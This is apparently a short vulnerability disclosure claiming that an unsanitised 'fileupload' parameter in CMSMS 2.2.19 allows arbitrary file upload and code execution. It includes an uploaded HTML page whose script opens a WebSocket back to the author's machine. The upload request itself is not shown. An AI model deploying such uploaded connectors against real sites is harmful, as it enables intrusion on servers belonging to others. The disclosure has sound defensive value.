title: CMSMS 2.2.19 Arbitrary File Upload Vulnerability
author: nu11secur1ty
cves: 

Description:

The parameter "fileupload" in type ID is vulnerable to File Upload and RCE attacks, it is not sanitized correctly. The attacker can upload a virus directly on the server by using this web vulnerability, and then he can execute it, this can be the end of this server depending on the scenario! In this case, I just uploaded a [WebSocket] connector - exploit.html to connect the server with my machine, this is so nasty. I am a Penetration Tester, not a stupid cracker! Thank you all!

STATUS: HIGH- Vulnerability

[+]Exploit execution:

[+]Exploit:

<html>
	<script>
(() => {
  const ws = new WebSocket('ws://0.0.0.0:8080')
  ws.onopen = () => {
    console.log('ws opened on browser')
    ws.send('hello, you are connected with malicious software.')
  }

  ws.onmessage = (message) => {
    console.log(`message received ${message}`)
  }

})()
 </script>
</html>
